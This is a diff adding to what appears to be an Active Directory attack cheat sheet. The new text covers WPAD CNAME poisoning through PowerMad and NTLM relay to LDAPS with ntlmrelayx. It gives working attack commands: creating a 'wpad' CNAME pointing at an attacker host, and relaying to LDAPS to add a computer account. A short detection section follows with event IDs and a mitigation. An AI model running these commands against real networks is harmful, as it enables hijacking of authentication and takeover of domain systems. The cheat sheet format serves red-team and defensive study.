@@ -21,3 +21,14 @@ Create a **CNAME** pointing at the attacker, then coercion sends a privileged ho
 
 ### Commands
 ```bash
+# ── Create a CNAME via PowerMad ──────────────────────────────────────
+Invoke-DNSUpdate -DNSType CNAME -Name 'wpad' -Data 'attacker.corp.local'
+
+# ── Relay to LDAPS ───────────────────────────────────────────────────
+ntlmrelayx.py -t ldaps://10.10.10.5 --add-computer
+```
+
+### Detection
+**5136** on `MicrosoftDNS`; **4662** zone writes; disable insecure dynamic updates.
+
+---
